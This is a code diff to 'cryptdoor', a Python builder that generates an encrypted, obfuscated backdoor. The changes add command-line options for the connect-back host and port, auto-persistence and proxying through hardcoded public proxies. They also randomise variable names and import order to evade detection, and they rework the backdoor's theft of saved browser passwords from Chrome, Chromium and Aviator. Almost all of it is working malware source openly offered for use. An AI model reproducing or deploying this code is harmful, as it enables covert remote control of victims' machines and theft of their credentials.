@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 from Crypto.Cipher import AES
-import base64, random, string, sys, os
+import base64, random, string, sys, os, argparse
 
 BLOCK_SIZE, PADDING = 32, '{'
 
@@ -11,10 +11,46 @@ def randKey(bytes):
 def randVar():
 	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))
 
+parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
+parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
+parser.add_argument("-p", "--port", type=str, help="Port.")
+parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
+parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
+parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
+parser.add_argument('-s', "--servername", type=str, help='Name of server (default server.py).')
+args = parser.parse_args()
+
+if len(sys.argv) == 1:
+	parser.print_help()
+	exit()
+
+if args.hostname and args.port:
+	hostname = args.hostname
+	portnumber = args.port
+else:
+	parser.print_help()
+	exit()
+
+if args.backdoorname:
+	backdoorName = args.backdoorname
+else:
+	backdoorName = "backdoor.py"
+
+if args.servername:
+	serverName = args.servername
+else:
+	serverName = "server.py"
+
+if args.proxy:
+	proxysetting = 'useproxy = True**n'
+else:
+	proxysetting = 'useproxy = False**n'
+
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
+b64var, AESvar = randVar(), randVar()
 triplequote = "'" * 3
 complexcommand = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
 
@@ -145,8 +181,8 @@ BLOCK_SIZE, PADDING, keydump = 32, '{', ''
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
-iv = Random.new().read(AES.block_size)
-cipher = AES.new(secret,AES.MODE_CFB, iv)
+iv = Random.new().read(''' + AESvar + '''.block_size)
+cipher = ''' + AESvar + '''.new(secret,''' + AESvar + '''.MODE_CFB, iv)
 MeterBin, DropSock, pconnect = None, None, False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
@@ -237,8 +273,8 @@ elif os.name == 'posix':
 	if os.getuid() == 0:
 		isSystem = True
 	pwdvar = 'pwd'
-	ushell = os.popen('echo $SHELL').read().strip()
-	pwd = fsubprocess(pwdvar).strip('**n')
+	ushell = os.getenv('SHELL')
+	pwd = os.getenv('PWD')
 	paddedpwd = pwd + '*' * (64 - len(pwd))
 	if isSystem:
 		if is64:
@@ -259,7 +295,7 @@ else:
 	#################################################################################################################
 
                                # HTTP PROXY SETTINGS - proxies can only be HTTP/S !
-useproxy = False               # Set to True to use the proxy.
+
 							   # Add as many proxies as you want below, the script will
 							   # try them all in order in a loop until it connects.
 
@@ -268,6 +304,7 @@ proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 30
 
 	#################################################################################################################
 
+''' + proxysetting + '''
 if useproxy:
 	while not pconnect:
 		for proxy in proxies:
@@ -307,18 +344,23 @@ while 1:
 			sendpass = ''
 			appdata = os.getenv("APPDATA")
 			paths = []
-			if os.path.isfile(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
-				paths.append([appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Chrome'])
+			chromepath = appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)
+			chromiumpath = appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)
+			aviatorpath = appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)
 
-			if os.path.isfile(appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
-				paths.append([appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Chromium'])
+			if os.path.isfile(chromepath):
+				paths.append([chromepath, 'Chrome'])
 
-			if os.path.isfile(appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
-				paths.append([appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Aviator']) 
+			if os.path.isfile(chromiumpath):
+				paths.append([chromiumpath, 'Chromium'])
+
+			if os.path.isfile(aviatorpath):
+				paths.append([aviatorpath, 'Aviator']) 
 
 			if len(paths) > 0:
+				sendit = ''
 				for passpath in paths:
-					sendpass, sendit = '', ''
+					sendpass = ''
 					connection = sqlite3.connect(passpath[0])
 					cursor = connection.cursor()
 					cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
@@ -470,44 +512,40 @@ while 1:
 
 s.close()
 '''
-try:
-	hostname, portnumber = sys.argv[1], sys.argv[2]
-except:
-	print ' Usage ./cryptdoor.py host port (-p)'
-	exit()
 
-
-backdoorName = "backdoor.py"
-serverName = "server.py"
-
-try:
-	if sys.argv[3] == '-p':
-		finalbackdoor = part1 + persistpart + part2
-		print ' [*] Auto-persistence enabled.'
-	else:
-		finalbackdoor = part1 + part2
-except:
+if args.persistence:
+	finalbackdoor = part1 + persistpart + part2
+	print ' [*] Auto-persistence enabled.'
+else:
 	finalbackdoor = part1 + part2
 
 readyscript = finalbackdoor.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r')
 f = open(backdoorName, 'w')
 cipherEnc = AES.new(key)
 encrypted = EncodeAES(cipherEnc, readyscript)
-
-b64var = randVar()
-aesvar = 'AES'
 f.write('''#!/usr/bin/env python
-import subprocess,platform,socket,base64,os,struct,socket,urllib2,binascii,ctypes,time,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
-try:
-	import socks
-except:
+import ''')
+
+myimports = ['subprocess', 'platform', 'socket', 'base64','os,struct','urllib2','binascii','ctypes','threading','string','sqlite3']
+myendings = ['from Crypto import Random','from Crypto.Cipher import AES as %s' % (AESvar),'from base64 import b64decode as %s' % (b64var)]
+mywindows = ['win32api','win32gui','win32file','win32console','win32crypt','pyHook','pythoncom','win32con']
+
+if args.proxy:
+	mywindows.append('socks')
+
+random.shuffle(myimports)
+random.shuffle(myendings)
+random.shuffle(mywindows)
+
+f.write(",".join(myimports) + "\n")
+f.write(";".join(myendings) + "\n")
+f.write('''try:
+	import ''')
+f.write(",".join(mywindows) + "\n")
+f.write('''except:
 	pass
-try:
-	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32con
-except:
-	pass
-''' % (b64var))
-f.write("exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted))))
+''')
+f.write("exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,b64var,encrypted))))
 f.close()
 
 rawserv = '''#!/usr/bin/env python
